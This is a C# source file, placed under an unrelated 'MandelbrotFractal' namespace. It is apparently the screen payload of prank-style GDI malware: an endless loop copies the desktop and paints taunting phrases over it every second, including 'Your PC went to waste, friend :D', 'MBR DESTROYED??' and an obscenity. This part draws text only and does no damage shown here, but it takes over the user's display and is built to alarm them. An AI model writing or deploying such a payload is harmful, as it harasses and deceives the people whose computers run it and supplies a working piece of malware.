using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MandelbrotFractal
{
    public class TextScreen
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll", SetLastError = true)]
        private static extern IntPtr CreateCompatibleDC(IntPtr hDC);

        [DllImport("gdi32.dll", SetLastError = true)]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth, int nHeight);

        [DllImport("gdi32.dll", SetLastError = true)]
        private static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);

        [DllImport("gdi32.dll", SetLastError = true)]
        private static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll", SetLastError = true)]
        private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        private const int SRCCOPY = 0x00CC0020;

        public static void SpawnText()
        {
            string[] phrases = { "OPS", "OMG!!", "DUCK DUCK", "I shit on you", "Your PC went to waste, friend :D", "COFF COFF", "ROBUX FREE??", "Wooden leg", 
                "OH NO OH NO OH NO NO NO NO NO", "MBR DESTROYED??", "CYBERWARE"}; // Frases
            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;
            Random random = new Random();
            float scale = 1.0f;

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr hbit = CreateCompatibleBitmap(hdc, screenWidth, screenHeight);
                IntPtr holdbit = SelectObject(mhdc, hbit);
                BitBlt(mhdc, 0, 0, screenWidth, screenHeight, hdc, 0, 0, SRCCOPY);

                using (Graphics g = Graphics.FromHdc(mhdc))
                {
                    foreach (var phrase in phrases)
                    {
                        using (Font font = new Font("Chiller", random.Next(25, 32)))
                        {
                            float x = random.Next(0, screenWidth - 200);
                            float y = random.Next(0, screenHeight - 50);
                            Color rgbColor = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256));
                            Brush brush = new SolidBrush(rgbColor);
                            g.DrawString(phrase, font, brush, x, y);
                        }
                    }
                }

                BitBlt(hdc, 0, 0, screenWidth, screenHeight, mhdc, 0, 0, SRCCOPY);

                SelectObject(mhdc, holdbit);
                DeleteObject(holdbit);
                DeleteObject(hbit);
                DeleteObject(mhdc);
                ReleaseDC(IntPtr.Zero, hdc);

                Thread.Sleep(1000);
            }
        }
    }
}
